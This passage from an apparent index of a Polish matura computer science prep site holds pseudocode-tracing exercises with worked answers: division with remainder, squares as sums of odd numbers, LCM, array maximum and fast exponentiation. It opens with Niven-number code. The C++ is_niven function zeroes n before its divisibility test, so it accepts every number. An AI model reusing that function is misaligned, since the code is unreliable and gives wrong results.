is_niven(k)]\n\nprint(*niven_numbers, sep=\"\\n\")\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nbool is_niven(int n) {\n    int sum = 0;\n    while (n &gt; 0) {\n        sum += n % 10;\n        n /= 10;\n    }\n    return n % sum == 0;\n}\n\nint main() {\n    ifstream file(\"niven.txt\");\n    int num;\n\n    for (int i = 0; i &lt; 100; i++) {\n        file &gt;&gt; num;\n        if (is_niven(num)) {\n            cout &lt;&lt; num &lt;&lt; endl;\n        }\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/","title":"\u0106wiczenie 1","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/#dane","title":"Dane","text":"<ul> <li>\\(x\\), \\(y\\) - liczby naturalne, \\(x &gt; 0\\), \\(y &gt; 0\\). </li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/#pseudokod","title":"Pseudokod","text":"<pre><code>1. q := 0\n2. r := x\n3. Dop\u00f3ki y &lt;= r, wykonuj:\n    4. q := q + 1\n    5. r := r - y\n\n6. Wypisz q\n7. Wypisz r \n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj wynik dzia\u0142ania programu dla danych: <code>x := 10, y := 3</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj wynik dzia\u0142ania programu dla danych: <code>x := 50, y := 15</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj specyfikacj\u0119 wyniku dla powy\u017cszego programu.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-1/#symulacja","title":"Symulacja","text":"<pre><code>[x = 10, y = 3]\n\n1. [q = 0]\n2. [r = 10]\n\n3. Dop\u00f3ki 3 &lt;= 10 - OK\n    1. [q = 0 + 1 = 1]\n    2. [r = 10 - 3 = 7]\n\n4. Dop\u00f3ki 3 &lt;= 7 - OK\n    1. [q = 1 + 1 = 2]\n    2. [r = 7 - 3 = 4]\n\n5. Dop\u00f3ki 3 &lt;= 4 - OK\n    1. [q = 2 + 1 = 3]\n    2. [r = 4 - 3 = 1]\n\n6. Dop\u00f3ki 3 &lt;= 1 - NIE (koniec p\u0119tli)\n\n7. Wypisz 3\n8. Wypisz 1    \n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-1/#wynik","title":"Wynik","text":"<p>\\(q=3,\\ r=1\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-2/#symulacja","title":"Symulacja","text":"<pre><code>[x = 50, y = 15]\n\n1. [q = 0]\n2. [r = 50]\n\n3. Dop\u00f3ki 15 &lt;= 50 - OK\n    4. [q = 0 + 1 = 1]\n    5. [r = 50 - 15 = 35]\n\n3. Dop\u00f3ki 15 &lt;= 35 - OK\n    4. [q = 1 + 1 = 2]\n    5. [r = 35 - 15 = 20]\n\n3. Dop\u00f3ki 15 &lt;= 20 - OK\n    4. [q = 2 + 1 = 3]\n    5. [r = 20 - 15 = 5]\n\n3. Dop\u00f3ki 15 &lt;= 5 - NIE (koniec p\u0119tli)\n\n6. Wypisz 3\n7. Wypisz 5\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-2/#wynik","title":"Wynik","text":"<p>\\(q=3,\\ r=5\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(x\\), \\(y\\) - liczby naturalne, \\(x &gt; 0\\), \\(y &gt; 0\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-1/solution-3/#wynik","title":"Wynik","text":"<ul> <li>\\(q\\) - wynik dzielenia ca\u0142kowitego \\(x\\) przez \\(y\\) (<code>q = x div y</code>)</li> <li>\\(r\\) - wynik reszty z dzielenia \\(x\\) przez \\(y\\) (<code>r = x mod y</code>)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/","title":"\u0106wiczenie 2","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#dane","title":"Dane","text":"<ul> <li>\\(x\\) - liczba ca\u0142kowita.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#pseudokod","title":"Pseudokod","text":"<pre><code>1. k := 1\n2. n := 0\n3. w := 0\n4. Dop\u00f3ki n &lt; x, wykonuj:\n    5. w := w + k\n    6. k := k + 2\n    7. n := n + 1\n8. Wypisz w\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj wynik dzia\u0142ania programu dla <code>x := 2</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj wynik dzia\u0142ania programu dla <code>x := 5</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj wynik dzia\u0142ania programu dla <code>x := 20</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#zadanie-4","title":"Zadanie 4","text":"<p>Jaki b\u0119dzie wynik dzia\u0142ania programu dla <code>x := -5</code>?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#zadanie-5","title":"Zadanie 5","text":"<p>Jaki b\u0119dzie wynik dzia\u0142ania programu dla <code>x := 0</code>?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj specyfikacj\u0119 wyniku dla powy\u017cszego programu.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-1/#symulacja","title":"Symulacja","text":"<pre><code>[x = 2]\n\n1. [k = 1]\n2. [n = 0]\n3. [w = 0]\n\n4. Dop\u00f3ki 0 &lt; 2 - OK\n    5. [w = 0 + 1 = 1]\n    6. [k = 1 + 2 = 3]\n    7. [n = 0 + 1 = 1]\n\n4. Dop\u00f3ki 1 &lt; 2 - OK\n    5. [w = 1 + 3 = 4]\n    6. [k = 3 + 2 = 5]\n    7. [n = 1 + 1 = 2]\n\n4. Dop\u00f3ki 2 &lt; 2 - NIE (koniec p\u0119tli)\n\n8. Wypisz 4\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-1/#wynik","title":"Wynik","text":"<p>\\(4\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-2/#symulacja","title":"Symulacja","text":"<pre><code>[x = 5]\n\n1. [k = 1]\n2. [n = 0]\n3. [w = 0]\n\n4. Dop\u00f3ki 0 &lt; 5 - OK\n    5. [w = 0 + 1 = 1]\n    6. [k = 1 + 2 = 3]\n    7. [n = 0 + 1 = 1]\n\n4. Dop\u00f3ki 1 &lt; 5 - OK\n    5. [w = 1 + 3 = 4]\n    6. [k = 3 + 2 = 5]\n    7. [n = 1 + 1 = 2]\n\n4. Dop\u00f3ki 2 &lt; 5 - OK\n    5. [w = 4 + 5 = 9]\n    6. [k = 5 + 2 = 7]\n    7. [n = 2 + 1 = 3]\n\n4. Dop\u00f3ki 3 &lt; 5 - OK\n    5. [w = 9 + 7 = 16]\n    6. [k = 7 + 2 = 9]\n    7. [n = 3 + 1 = 4]\n\n4. Dop\u00f3ki 4 &lt; 5 - OK\n    5. [w = 16 + 9 = 25]\n    6. [k = 9 + 2 = 11]\n    7. [n = 4 + 1 = 5]\n\n4. Dop\u00f3ki 5 &lt; 5 - NIE (koniec p\u0119tli)\n\n8. Wypisz 25\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-2/#wynik","title":"Wynik","text":"<p>\\(25\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-3/#wynik","title":"Wynik","text":"<p>\\(400\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-4/#symulacja","title":"Symulacja","text":"<pre><code>[x = -5]\n\n1. [k = 1]\n2. [n = 0]\n3. [w = 0]\n\n4. Dop\u00f3ki 0 &lt; -5 - NIE (koniec p\u0119tli)\n\n8. Wypisz 0\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-4/#wynik","title":"Wynik","text":"<p>\\(0\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-5/#symulacja","title":"Symulacja","text":"<pre><code>[x = 0]\n\n1. [k = 1]\n2. [n = 0]\n3. [w = 0]\n\n4. Dop\u00f3ki 0 &lt; 0 - NIE (koniec p\u0119tli)\n\n8. Wypisz 0\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-5/#wynik","title":"Wynik","text":"<p>\\(0\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(x\\) - liczba ca\u0142kowita.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-2/solution-6/#wynik","title":"Wynik","text":"<ul> <li>\\(x^2\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/","title":"\u0106wiczenie 3","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#dane","title":"Dane","text":"<ul> <li>\\(x, y\\) - liczby naturalne.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#pseudokod","title":"Pseudokod","text":"<pre><code>1. wx := x\n2. wy := y\n3. Dop\u00f3ki wx != wy, wykonuj:\n    4. Je\u017celi wx &gt; wy, to: \n        5. wy := wy + y\n    6. W przeciwnym przypadku:\n        7. wx := wx + x\n\n8. Wypisz wx\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj wynik dzia\u0142ania programu dla <code>x := 5, y := 2</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj wynik dzia\u0142ania programu dla <code>x := 12, y := 8</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj wynik dzia\u0142ania programu dla <code>x := 1, y := 13</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#zadanie-4","title":"Zadanie 4","text":"<p>Ile razy zostanie wykonana instrukcja 4 (sprawdzenie warunku) dla danych <code>x := 7, y := 3</code>?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj przyk\u0142adowe dane wej\u015bciowe, dla kt\u00f3rych instrukcja 4 (sprawdzenie warunku) zostanie wykonana dok\u0142adnie raz.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj specyfikacj\u0119 wyniku dla powy\u017cszego programu.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-1/#symulacja","title":"Symulacja","text":"<pre><code>[x = 5]\n[y = 2]\n\n1. [wx = 5]\n2. [wy = 2]\n\n3. Dop\u00f3ki 5 != 2 - OK\n    4. Je\u017celi 5 &gt; 2 - OK\n        5. [wy = 2 + 2 = 4]\n\n3. Dop\u00f3ki 5 != 4 - OK\n    4. Je\u017celi 5 &gt; 4 - OK\n        5. [wy = 4 + 2 = 6]\n\n3. Dop\u00f3ki 5 != 6 - OK\n    4. Je\u017celi 5 &gt; 6 - NIE\n    6. w p.w.\n        7. [wx = 5 + 5 = 10]\n\n3. Dop\u00f3ki 10 != 6 - OK\n    4. Je\u017celi 10 &gt; 6 - OK\n        5. [wy = 6 + 2 = 8]\n\n3. Dop\u00f3ki 10 != 8 - OK\n    4. Je\u017celi 10 &gt; 8 - OK\n        5. [wy = 8 + 2 = 10]\n\n3. Dop\u00f3ki 10 != 10 - NIE\n\n8. Wypisz 10\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-1/#wynik","title":"Wynik","text":"<p>\\(10\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-2/#symulacja","title":"Symulacja","text":"<pre><code>[x = 12]\n[y = 8]\n\n1. [wx = 12]\n2. [wy = 8]\n\n3. Dop\u00f3ki 12 != 8 - OK\n    4. Je\u017celi 12 &gt; 8 - OK\n        5. [wy = 8 + 8 = 16]\n\n3. Dop\u00f3ki 12 != 16 - OK\n    4. Je\u017celi 12 &gt; 16 - NIE\n    6. w p.w.\n        7. [wx = 12 + 12 = 24]\n\n3. Dop\u00f3ki 24 != 16 - OK\n    4. Je\u017celi 24 &gt; 16 - OK\n        5. [wy = 16 + 8 = 24]\n\n3. Dop\u00f3ki 24 != 24 - NIE\n\n8. Wypisz 24\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-2/#wynik","title":"Wynik","text":"<p>\\(24\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-3/#symulacja","title":"Symulacja","text":"<pre><code>[x = 1]\n[y = 13]\n\n1. [wx = 1]\n2. [wy = 13]\n\n3. Dop\u00f3ki 1 != 13 - OK\n    4. Je\u017celi 1 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 1 + 1 = 2]\n\n3. Dop\u00f3ki 2 != 13 - OK\n    4. Je\u017celi 2 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 2 + 1 = 3]\n\n3. Dop\u00f3ki 3 != 13 - OK\n    4. Je\u017celi 3 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 3 + 1 = 4]\n\n3. Dop\u00f3ki 4 != 13 - OK\n    4. Je\u017celi 4 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 4 + 1 = 5]\n\n3. Dop\u00f3ki 5 != 13 - OK\n    4. Je\u017celi 5 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 5 + 1 = 6]\n\n3. Dop\u00f3ki 6 != 13 - OK\n    4. Je\u017celi 6 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 6 + 1 = 7]\n\n3. Dop\u00f3ki 7 != 13 - OK\n    4. Je\u017celi 7 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 7 + 1 = 8]\n\n3. Dop\u00f3ki 8 != 13 - OK\n    4. Je\u017celi 8 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 8 + 1 = 9]\n\n3. Dop\u00f3ki 9 != 13 - OK\n    4. Je\u017celi 9 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 9 + 1 = 10]\n\n3. Dop\u00f3ki 10 != 13 - OK\n    4. Je\u017celi 10 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 10 + 1 = 11]\n\n3. Dop\u00f3ki 11 != 13 - OK\n    4. Je\u017celi 11 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 11 + 1 = 12]\n\n3. Dop\u00f3ki 12 != 13 - OK\n    4. Je\u017celi 12 &gt; 13 - NIE\n    6. w p.w.\n        7. [wx = 12 + 1 = 13]\n\n3. Dop\u00f3ki 13 != 13 - NIE\n\n8. Wypisz 13\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-3/#wynik","title":"Wynik","text":"<p>\\(13\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-4/#symulacja","title":"Symulacja","text":"<pre><code>[x = 7]\n[y = 3]\n\n1. [wx = 7]\n2. [wy = 3]\n\n3. Dop\u00f3ki 7 != 3 - OK\n    4. Je\u017celi 7 &gt; 3 - OK\n        5. [wy = 3 + 3 = 6]\n\n3. Dop\u00f3ki 7 != 6 - OK\n    4. Je\u017celi 7 &gt; 6 - OK\n        5. [wy = 6 + 3 = 9]\n\n3. Dop\u00f3ki 7 != 9 - OK\n    4. Je\u017celi 7 &gt; 9 - NIE\n    6. w p.w.\n        7. [wx = 7 + 7 = 14]\n\n3. Dop\u00f3ki 14 != 9 - OK\n    4. Je\u017celi 14 &gt; 9 - OK\n        5. [wy = 9 + 3 = 12]\n\n3. Dop\u00f3ki 14 != 12 - OK\n    4. Je\u017celi 14 &gt; 12 - OK\n        5. [wy = 12 + 3 = 15]\n\n3. Dop\u00f3ki 14 != 15 - OK\n    4. Je\u017celi 14 &gt; 15 - NIE\n    6. w p.w.\n        7. [wx = 14 + 7 = 21]\n\n3. Dop\u00f3ki 21 != 15 - OK\n    4. Je\u017celi 21 &gt; 15 - OK\n        5. [wy = 15 + 3 = 18]\n\n3. Dop\u00f3ki 21 != 18 - OK\n    4. Je\u017celi 21 &gt; 18 - OK\n        5. [wy = 18 + 3 = 21]\n\n3. Dop\u00f3ki 21 != 21 - NIE\n\n8. Wypisz 21\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-4/#wynik","title":"Wynik","text":"<p>Instrukcja 4 zostanie wykonana \\(8\\) razy.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>x = 4\ny = 2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(x, y\\) - liczby naturalne.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-3/solution-6/#wynik","title":"Wynik","text":"<ul> <li><code>NWW(x, y)</code> - najmniejsza wsp\u00f3lna wielokrotno\u015b\u0107 \\(x\\) oraz \\(y\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/","title":"\u0106wiczenie 4","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczba element\u00f3w w tablicy.</li> <li>\\(tab[1..n]\\) - tablica \\(n\\) warto\u015bci ca\u0142kowitych, numerowana od jedynki.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#pseudokod","title":"Pseudokod","text":"<pre><code>1. el := tab[1]\n2. i := 1\n3. Dop\u00f3ki i &lt;= n, wykonuj:\n    4. Je\u017celi tab[i] &gt; el, to:\n        5. el := tab[i]\n    6. i := i + 1\n\n7. Wypisz el\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj wynik programu dla danych <code>n := 5, tab := [4, 7, 2, 10, 1]</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj wynik programu dla danych <code>n := 10, tab := [5, 8, 1, 3, 6, 10, 1, 10, 12, 9]</code></p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#zadanie-3","title":"Zadanie 3","text":"<p>Ile razy zostanie wykonana instrukcja 4 dla danych z pierwszego zadania, a ile razy dla danych z drugiego zadania?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj specyfikacj\u0119 wyniku dla powy\u017cszego algorytmu.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/#zadanie-5","title":"Zadanie 5","text":"<p>Jaka jest z\u0142o\u017cono\u015b\u0107 powy\u017cszego algorytmu?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<p>Wynik: \\(10\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<p>Wynik: \\(12\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<p>Wynik dla pierwszego zadania: \\(5\\)</p> <p>Wynik dla drugiego zadania: \\(10\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczba element\u00f3w w tablicy.</li> <li>\\(tab[1..n]\\) - tablica \\(n\\) warto\u015bci ca\u0142kowitych, numerowana od jedynki.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza warto\u015b\u0107 z tablicy \\(tab\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-4/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<p>Z\u0142o\u017cono\u015b\u0107: \\(O(n)\\) - liniowa. </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/","title":"\u0106wiczenie 5","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba rzeczywista</li> <li>\\(n\\) - liczba naturalna, \\(n \\neq 0\\) </li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#wynik","title":"Wynik","text":"<ul> <li>Liczba rzeczywista \\(p=a^n\\) </li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#pseudokod","title":"Pseudokod","text":"<pre><code>1. p := 1\n2. b := a\n3. Dop\u00f3ki n &gt; 0, wykonuj:\n    4. Je\u017celi n mod 2 = 1, to\n        5. p := p * b\n    6. b := b * b\n    7. n := n div 2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#zadanie-1","title":"Zadanie 1","text":"<p>Przeanalizuj powy\u017cszy algorytm i uzupe\u0142nij poni\u017csz\u0105 tabel\u0119 warto\u015bciami zmiennych \\(p\\), \\(b\\) oraz \\(n\\) po kolejnych wykonaniach kroku 3 dla dowolnej pocz\u0105tkowej warto\u015bci \\(a\\) oraz pocz\u0105tkowej warto\u015bci zmiennej \\(n\\) r\u00f3wnej \\(12\\).</p> p b n 1 a 12 1 \\(a^2\\)"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#zadanie-2","title":"Zadanie 2","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabel\u0119 wpisuj\u0105c liczby wszystkich mno\u017ce\u0144 wykonywanych przez powy\u017cszy algorytm dla podanych warto\u015bci \\(n\\), tzn. liczby wykonanych instrukcji <code>p:=p*b</code> i <code>b:=b*b</code></p> <code>n</code> liczba mno\u017ce\u0144 2 3 4 5 6 7"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/#zadanie-3","title":"Zadanie 3","text":"<p>Jaka jest z\u0142o\u017cono\u015b\u0107 powy\u017cszego algorytmu?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"p b n 1 a 12 1 \\(a^2\\) 6 1 \\(a^4\\) 3 \\(a^4\\) \\(a^8\\) 1 \\(a^{12}\\) \\(a^{16}\\) 0"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<code>n</code> liczba 